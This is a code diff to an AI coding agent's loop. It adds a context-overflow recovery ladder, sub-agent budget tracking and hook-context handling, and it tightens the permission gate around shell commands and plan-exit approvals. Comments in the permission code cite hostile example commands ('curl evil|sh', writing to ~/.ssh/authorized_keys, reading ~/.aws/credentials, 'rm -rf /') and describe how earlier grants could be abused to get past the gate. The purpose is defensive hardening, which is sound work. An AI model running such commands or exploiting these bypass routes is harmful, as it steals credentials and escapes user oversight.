@@ -2,11 +2,11 @@ import type { CompletionRequest, ContentBlock, Effort, ImageBlock, Message, Prov
 import type { ToolRegistry } from '../tools/registry.js';
 import type { ToolContext, ToolResult, ToolRisk } from '../tools/types.js';
 import { isAutonomyAtLeast, needsApproval, type AutonomyLevel } from '../safety/permissions.js';
-import { isBashReadOnly } from '../safety/bashReadOnly.js';
+import { isBashReadOnly, commandReadsOutsideRoots } from '../safety/bashReadOnly.js';
 import { classifyToolCall } from '../safety/classifier.js';
 import { resolvePermissionRule, type PermissionRule } from '../safety/rules.js';
 import type { ShadowConfig } from '../config.js';
-import { runHooks, runHookPhase } from '../hooks/runner.js';
+import { runHooks, runHookPhase, combineHookContexts } from '../hooks/runner.js';
 import { diagnosticsNoteFor } from './diagnostics.js';
 import { isFallbackEligible, resolveFallbackEntry } from '../provider/fallback.js';
 import { looksLikeTokenOverflow } from '../provider/stream.js';
@@ -58,6 +58,12 @@ export interface LoopDeps {
   /** F06-10: true when this loop IS a sub-agent. Stamped onto every ToolContext so a nested
    *  `agent` call can bypass the admission gate (deadlock guard — see makeAgentTool). */
   nestedAgent?: boolean;
+  /** P3-09 (F04-08): the turn/run budget at the ROOT of this loop's delegation tree. Unset for a
+   *  top-level loop (it IS the root — its own budget is stamped). Threaded down to every sub-loop
+   *  and re-stamped onto every ToolContext so a background sub-agent at any depth can roll its
+   *  spend up into a budget that stays alive for the whole turn/run, even after intermediate
+   *  ancestors have finished. */
+  rootBudget?: Budget;
   dryRun: boolean;
   maxToolResultChars: number;
   contextBudget: number; // tokens, for the HUD context-% readout
@@ -270,7 +276,13 @@ export class AgentLoop {
     this.deps.permissionRules = rules;
   }
 
-  private async maybeCompact(provider: Provider, model: string, system: string, force = false): Promise<boolean> {
+  private async maybeCompact(
+    provider: Provider,
+    model: string,
+    system: string,
+    force = false,
+    aggressiveKeep = false,
+  ): Promise<boolean> {
     // P1B-02: cheap in-place reclamation FIRST — clear stale compactable tool_result bodies before
     // the (expensive) summarizer round-trip. Silent by design; if it frees enough, the summarizer
     // no-ops this turn. Wrapped so a microcompaction failure can never suppress the real fallback.
@@ -293,6 +305,7 @@ export class AgentLoop {
           runHookPhase('pre_compact', this.deps.hooks.pre_compact, { workspaceRoot: this.deps.workspaceRoot });
         }
       },
+      aggressiveKeep,
     });
     if (result === 'summarized' || result === 'truncated') {
       this.deps.bus.emit({ type: 'compaction', trigger: 'auto', degraded: result === 'truncated' });
@@ -827,7 +840,8 @@ export class AgentLoop {
   }> {
     let model = this.deps.model;
     let activeProvider = provider;
-    let overflowCompactTried = false;
+    // F08-06: rung counter for the reactive overflow ladder (was a single-shot boolean).
+    let overflowRung = 0;
     const interruptedTurn = () => ({
       text: '',
       toolCalls: [] as ToolCall[],
@@ -836,7 +850,47 @@ export class AgentLoop {
       badCalls: [] as string[],
       namelessCall: false,
     });
-    for (let attempt = 0; attempt < 3; attempt++) {
+    // Ladder rung 2: strip image blocks + shrink the kept tail + re-compact keeping HALF the tail.
+    // Extracted so a rung 1 that reclaimed NOTHING can escalate immediately instead of wedging: a
+    // short history dominated by a few fat tool_result/image bodies is exactly the shape the
+    // summarizer cannot help and local reclamation can — and overflowRung resets every turn, so a
+    // rung-1 failure that just returns would die on the same bare 400 every turn forever.
+    const rung2Reclaim = async (): Promise<{ recovered: boolean; why: string }> => {
+      overflowRung = 2;
+      const stripped = this.deps.context.stripImageBlocks();
+      const shrank = this.deps.context.shrinkForOverflow();
+      let recompacted = false;
+      try {
+        recompacted = await this.maybeCompact(activeProvider, model, this.deps.system, true, true);
+      } catch (recompactErr) {
+        // The re-compact threw AFTER strip/shrink already reclaimed — do not declare the context
+        // irrecoverable without a retry: the reclaimed history may now fit. The next overflow (if
+        // any) reaches the terminal branch with nothing left to reclaim.
+        if (stripped > 0 || shrank) {
+          return {
+            recovered: true,
+            why: `context overflow — ${[
+              stripped > 0 ? `stripped ${stripped} image block(s)` : '',
+              shrank ? 'shrunk kept tail' : '',
+            ]
+              .filter(Boolean)
+              .join(', ')} (re-compact threw: ${(recompactErr as Error)?.message ?? recompactErr}) — retrying with reclaimed context`,
+          };
+        }
+        throw recompactErr;
+      }
+      return {
+        recovered: stripped > 0 || shrank || recompacted,
+        why: `context overflow — ${[
+          stripped > 0 ? `stripped ${stripped} image block(s)` : '',
+          shrank ? 'shrunk kept tail' : '',
+          recompacted ? 're-compacted with a shorter tail' : '',
+        ]
+          .filter(Boolean)
+          .join(', ') || 'no further reclamation possible'} — retrying`,
+      };
+    };
+    for (let attempt = 0; attempt < 4; attempt++) {
       if (req.signal?.aborted) return interruptedTurn();
       try {
         // Always send LIVE context (after a compact retry it shrinks), still healing any
@@ -850,40 +904,76 @@ export class AgentLoop {
         // frame while their aborted stream unwinds; that error belongs to the obsolete turn.
         if (req.signal?.aborted) return turn;
         const err = turn.providerError;
-        // Local 32k servers: "request (N tokens) exceeds available context size" — shrink history
-        // and retry once before giving up or falling back.
-        if (
-          !overflowCompactTried &&
-          err &&
-          !turn.text &&
-          turn.toolCalls.length === 0 &&
-          looksLikeTokenOverflow(err.message)
-        ) {
-          overflowCompactTried = true;
+        // F08-06 reactive compaction ladder (was single-shot): the request still exceeds the
+        // window after the stream layer's own output-cap shrink ladder. Bounded, cheapest first:
+        //   rung 1 — forced microcompact + summarization (or local truncation if the summarizer
+        //            fails) — the existing recovery;
+        //   rung 2 — strip image blocks + shrink the kept tail locally, then re-compact keeping
+        //            HALF the tail (also runs IMMEDIATELY when rung 1 reclaimed nothing);
+        //   after that — a clear "context irrecoverable" finding instead of a bare provider 400.
+        // Attempt budget: at most 4 requests — normally 3 (rung 1 retries on attempt 2, rung 2 on
+        // attempt 3, an attempt-3 overflow lands in the irrecoverable branch); a model fallback
+        // that consumed attempt 0 buys a 4th request INSIDE the loop so the rung-2-reclaimed
+        // context is actually sent (fresh messages, healing, and overflow handling all intact —
+        // the old after-loop fall-through re-sent the pre-ladder req.messages instead).
+        if (err && !turn.text && turn.toolCalls.length === 0 && looksLikeTokenOverflow(err.message)) {
+          let recovered = false;
+          let why = '';
+          const warnLadderThrow = (ladderErr: unknown): void => {
+            // A throw here means the overflow recovery failed. NOT gated on consumeDegradedReport
+            // (unlike the proactive path): a ladder throw is rare and severe, and the dedupe gate
+            // would swallow it entirely whenever the proactive path had already consumed the
+            // report token for this episode — leaving a silent wedge.
+            this.deps.bus.emit({
+              type: 'finding',
+              severity: 'warn',
+              title: 'Compaction error',
+              body: `Overflow compaction threw (${(ladderErr as Error)?.message ?? ladderErr}); context was not reclaimed.`,
+            });
+            this.deps.sessionLog?.record({ kind: 'compaction_degraded', mode: 'error' });
+          };
           try {
-            const did = await this.maybeCompact(activeProvider, model, this.deps.system, true);
-            if (req.signal?.aborted) return turn;
-            if (did) {
-              this.deps.bus.emit({
-                type: 'retry',
-                attempt: 1,
-                delayMs: 0,
-                reason: 'context overflow — compacted and retrying',
-              });
-              continue;
+            if (overflowRung === 0) {
+              overflowRung = 1;
+              recovered = await this.maybeCompact(activeProvider, model, this.deps.system, true);
+              why = 'context overflow — compacted and retrying';
+            } else if (overflowRung === 1) {
+              ({ recovered, why } = await rung2Reclaim());
             }
-          } catch (err) {
-            // Same visibility rule as the proactive path (F04-11): a throw here means the
-            // overflow recovery failed — surface it once instead of failing silently.
-            if (this.deps.context.consumeDegradedReport()) {
-              this.deps.bus.emit({
-                type: 'finding',
-                severity: 'warn',
-                title: 'Compaction error',
-                body: `Overflow compaction threw (${(err as Error)?.message ?? err}); context was not reclaimed.`,
-              });
-              this.deps.sessionLog?.record({ kind: 'compaction_degraded', mode: 'error' });
+          } catch (ladderErr) {
+            warnLadderThrow(ladderErr);
+          }
+          // Rung 1 failed to reclaim — whether it THREW (a summarizer failure) or RETURNED
+          // nothing. Escalate to rung 2 OUTSIDE the try so a summarizer throw cannot wedge the
+          // session at rung 1: local reclamation needs no summarizer and caps exactly the fat
+          // tool_result/image bodies a short history is dominated by. Runs once — rung2Reclaim
+          // sets overflowRung=2, so the loop's own rung-2 pass and this escalation never collide.
+          if (!recovered && overflowRung === 1) {
+            try {
+              ({ recovered, why } = await rung2Reclaim());
+            } catch (ladderErr) {
+              warnLadderThrow(ladderErr);
             }
+          }
+          if (req.signal?.aborted) return turn;
+          if (recovered) {
+            this.deps.bus.emit({ type: 'retry', attempt: overflowRung, delayMs: 0, reason: why });
+            continue;
+          }
+          if (overflowRung >= 2) {
+            // Ladder exhausted — honest, actionable end state. The provider's own 400 already
+            // rendered; this adds the what-now.
+            this.deps.bus.emit({
+              type: 'finding',
+              severity: 'error',
+              title: 'Context overflow — irrecoverable',
+              body:
+                'The request still exceeds the model’s window after compaction, image stripping, and ' +
+                'kept-tail shrinking. In the TUI: /clear the session or /rewind to an earlier turn. In ' +
+                'headless or web runs: start a fresh session, or switch to a model with a larger window.',
+            });
+            this.deps.sessionLog?.record({ kind: 'compaction_degraded', mode: 'overflow_irrecoverable' });
+            turn.providerError = { code: 'context_overflow', message: err.message };
           }
         }
         if (
@@ -952,8 +1042,16 @@ export class AgentLoop {
         throw err;
       }
     }
+    // Unreachable: the loop can `continue` at most three times (one fallback + two rung
+    // recoveries), so attempt 4 always returns. Defensive tail in case that invariant ever
+    // breaks: send LIVE, healed messages — NEVER req.messages, the pre-ladder snapshot built in
+    // run() (re-sending it re-overflows deterministically and wastes every rung's reclamation).
     if (req.signal?.aborted) return interruptedTurn();
-    return this.runProviderTurn(activeProvider, { ...req, model });
+    return this.runProviderTurn(activeProvider, {
+      ...req,
+      model,
+      messages: this.healDanglingToolUses(this.deps.context.messages()),
+    });
   }
 
   /** Consume one provider stream into accumulated text, tool calls, and stop reason. */
@@ -1279,7 +1377,12 @@ export class AgentLoop {
     }
 
     // Permission gate.
-    const planExitApproved = this.approvedPlanExitIds.has(call.id);
+    // BYPASS review (P2-07): the exemption is keyed to the exit_plan_mode CALL ITSELF, never to
+    // the id alone. Provider ids are not guaranteed unique across responses — Shadow's own
+    // OpenAI-compat fallback emits positional ids (`call_0`) when a server omits them — so a
+    // run_shell in the NEXT response would otherwise inherit an approved plan-exit's id and skip
+    // the ENTIRE gate, denylist suppression included. Only the exit call may match its approval.
+    const planExitApproved = call.name === 'exit_plan_mode' && this.approvedPlanExitIds.has(call.id);
     const planWriteAllowed = this.deps.planMode?.active === true && call.name === 'plan_write';
     const planReadLikeAllowed = this.deps.planMode?.active === true && isPlanModeReadLikeCall(call);
     const ruleAllow = ruleAction === 'allow';
@@ -1289,8 +1392,9 @@ export class AgentLoop {
     // ORDINARY commands; letting one suppress the denylist meant a single `/permissions add allow
     // run_shell …` silently disarmed the last guard against `rm -rf /` and friends, and it did so
     // invisibly — nothing in `/permissions list` said "this also turns off the denylist". The only
-    // remaining suppressor is the explicit plan-exit approval, which is a live human decision made
-    // on the spot rather than a config line written weeks earlier.
+    // remaining suppressor is the explicit plan-exit approval — a live human decision made on the
+    // spot, and scoped to the exit_plan_mode call itself (see planExitApproved above): no other
+    // call can inherit it, not even one that reuses the same provider id.
     const forced = planExitApproved ? null : (this.deps.forceConfirm?.(call, tool.risk) ?? null);
 
     // F07-01 (P1A-01): a write/edit that TOUCHES the safety config always gates — like the denylist,
@@ -1351,9 +1455,9 @@ export class AgentLoop {
         kind: 'permission',
         call,
         risk: tool.risk,
-        reason:
-          forced ??
-          (configTouch
+        reason: forced
+          ? `⛔ BLOCKED — acknowledge only · ${forced}`
+          : configTouch
             ? `editing the safety config (${call.name}) always requires confirmation (P1A-01)`
             : unconfinedNoBend
               ? '⚠ UNCONFINED — no OS sandbox on this host; run_shell will run WITHOUT confinement (policy: fail-closed — this gate never bends)'
@@ -1363,10 +1467,28 @@ export class AgentLoop {
                   ? classifierReason
                   : ruleAsk
                     ? `permission rule requires confirmation for ${call.name}`
-                    : `autonomy=${this.autonomy} requires confirmation for ${tool.risk}`),
+                    : `autonomy=${this.autonomy} requires confirmation for ${tool.risk}`,
         preview,
+        acknowledgeOnly: Boolean(forced),
       });
       if (this.preExecutionCancelled()) return this.cancelledCall(call);
+      // F07-09: the catastrophic denylist is a HARD BLOCK — its dialog is acknowledge-only. The
+      // old contract asked y/n and then blocked the command inside run_shell anyway, so pressing
+      // "yes" did nothing: a dead-end dialog is worse than none, because a user who learns their
+      // answer doesn't matter stops reading the one path that must never be skimmed. Now the
+      // question is honest: whatever the user answers is an ACKNOWLEDGEMENT, never a permit —
+      // the call is blocked and no grant (session/prefix/autonomy) is minted from this dialog.
+      if (forced) {
+        bus.emit({ type: 'tool_denied', call, reason: `catastrophic denylist: ${forced}` });
+        return {
+          block: this.resultBlock(
+            call.id,
+            false,
+            `Command blocked by the catastrophic-command denylist (${forced}). This gate is acknowledge-only — the command cannot be approved into running. Re-issue a safer, more specific command, or ask the user to run it themselves.`,
+          ),
+          isFatal: false,
+        };
+      }
       if (typeof decision === 'object' && 'setAutonomy' in decision) {
         this.setAutonomy(decision.setAutonomy);
       } else if (typeof decision === 'object' && 'approveForSession' in decision) {
@@ -1387,6 +1509,9 @@ export class AgentLoop {
     if (!parsed.success) return this.invalidInput(call, tool.risk, formatZodError(call.name, parsed.error));
 
     const hooks = this.deps.hooks;
+    // F08-09: `context` returned by exit-0 pre/post_tool_use hooks is folded into the tool result
+    // the model sees (control-stripped + clamped by the runner — hook stdout is untrusted input).
+    let hookNote: string | undefined;
     if (hooks?.pre_tool_use?.length) {
       const pre = runHooks('pre_tool_use', hooks.pre_tool_use, {
         tool: call.name,
@@ -1400,6 +1525,7 @@ export class AgentLoop {
           isFatal: false,
         };
       }
+      if (pre.context) hookNote = pre.context;
     }
 
     // Final safe boundary. Steering never cancels a tool once `tool_start` has been emitted, but
@@ -1411,6 +1537,14 @@ export class AgentLoop {
       workspaceRoot: this.deps.workspaceRoot,
       additionalRoots: this.deps.additionalRoots,
       nestedAgent: this.deps.nestedAgent === true,
+      // P3-09 (F04-08): the running loop's OWN budget is the immediate parent of any sub-agent
+      // this call spawns — the top loop stamps the turn/run budget, a sub-agent loop stamps its
+      // own budget, so nested delegation chains accrual upward one level at a time.
+      parentBudget: this.deps.budget,
+      // P3-09 (F04-08): the tree's ROOT budget — threaded down through the sub-loop deps, or this
+      // loop's own budget when absent (a top-level loop IS the root). Background sub-agents roll
+      // their spend up here so it reaches a living budget even if intermediate ancestors finished.
+      rootBudget: this.deps.rootBudget ?? this.deps.budget,
       signal: this.deps.signal,
       log: () => {},
       dryRun: this.deps.dryRun,
@@ -1453,13 +1587,16 @@ export class AgentLoop {
     }
 
     if (hooks?.post_tool_use?.length) {
-      runHooks('post_tool_use', hooks.post_tool_use, {
+      const post = runHooks('post_tool_use', hooks.post_tool_use, {
         tool: call.name,
         input: parsed.data,
         output: this.serialize(result),
         ok: result.ok,
         workspaceRoot: this.deps.workspaceRoot,
       });
+      // Combine through the runner's total clamp: pre and post each clamp independently, and the
+      // unclamped join could carry ~2× the cap into one tool result.
+      if (post.context) hookNote = combineHookContexts(hookNote, post.context);
     }
 
     // P3-06 v0 — diagnostics feedback loop: after a SUCCESSFUL file write, run the mapped
@@ -1474,6 +1611,7 @@ export class AgentLoop {
       diagnostics: this.deps.diagnostics,
     });
     if (diagNote) result.summary += diagNote;
+    if (hookNote) result.summary += `\n\nAdditional context (user hook):\n${hookNote}`;
 
     this.emitToolEnd(call, result);
 
@@ -1707,20 +1845,39 @@ export class AgentLoop {
   }
 
   private isSessionApproved(call: ToolCall, preview: string): boolean {
+    if (call.name !== 'run_shell') return this.approvals.hasTool(call.name);
+    const cmd = shellCommandOf(call.input) ?? preview;
+    const roots = [this.deps.workspaceRoot, ...(this.deps.additionalRoots ?? [])];
+    // BYPASS review (P2-07): the out-of-root demotion applies to EVERY session grant for
+    // run_shell — the whole-session tool approval (`(s)`) included, which used to return true
+    // above all scoping: one `(s)` on any gated command auto-ran `cat ~/.aws/credentials` for
+    // the rest of the session. A session grant vouches that shell commands may run; it does not
+    // vouch for WHERE they read (or write). Demotion only — the gate still allows a deliberate
+    // approval of the specific command.
+    if (commandReadsOutsideRoots(cmd, roots)) return false;
     if (this.approvals.hasTool(call.name)) return true;
-    if (call.name === 'run_shell') {
-      const cmd = shellCommandOf(call.input) ?? preview;
-      for (const prefix of this.approvals.listPrefixes()) {
-        if (!cmd.startsWith(prefix)) continue;
-        const tail = cmd.slice(prefix.length);
-        // Honor a session prefix approval ONLY if the remainder is a plain continuation of the SAME
-        // command (more args/flags) — NOT a chained/redirected/substituted/backgrounded payload. A bare
-        // startsWith let `git log; curl evil|sh` or `git log > ~/.ssh/authorized_keys` auto-run under an
-        // approval of `git log`. Require a word boundary after the prefix and reject any shell
-        // metacharacter in the tail; anything else falls through and re-gates (the user can re-approve).
-        if ((tail === '' || /^\s/.test(tail)) && !/[;&|<>`\n]/.test(tail) && !tail.includes('$(')) {
-          return true;
-        }
+    for (const prefix of this.approvals.listPrefixes()) {
+      if (!cmd.startsWith(prefix)) continue;
+      const tail = cmd.slice(prefix.length);
+      // Honor a session prefix approval ONLY if the remainder is a plain continuation of the SAME
+      // command (more args/flags) — NOT a chained/redirected/substituted/backgrounded payload. A bare
+      // startsWith let `git log; curl evil|sh` or `git log > ~/.ssh/authorized_keys` auto-run under an
+      // approval of `git log`. Require a word boundary after the prefix and reject any shell
+      // metacharacter in the tail; anything else falls through and re-gates (the user can re-approve).
+      if ((tail === '' || /^\s/.test(tail)) && !/[;&|<>`\n]/.test(tail) && !tail.includes('$(')) {
+        // F07-05: a prefix grant may not smuggle the tail OUT of the jail. `~` and `$VAR`
+        // expansions in the tail are rejected outright (`$?` whitelisted — it carries no path),
+        // and viewer/search commands that read outside the granted roots demote to the gate,
+        // exactly like the read-only fast path. Approve `cat` once and `cat ~/.aws/credentials`
+        // used to ride the grant; now it re-gates (demotion only — the user can still approve it).
+        // Regression review: the tilde check matches only where the shell actually EXPANDS — at
+        // the start of a token (after whitespace, or after `=` in an assignment). A mid-word `~`
+        // is literal data: `git diff HEAD~3` / `git log v2~1..v2` are git revision grammar, not
+        // home expansions, and keep riding their grants.
+        if (/(?:^|[\s=])~/.test(tail)) continue;
+        if (tail.replace(/\$\?/g, '').includes('$')) continue;
+        if (commandReadsOutsideRoots(cmd, roots)) continue;
+        return true;
       }
     }
     return false;
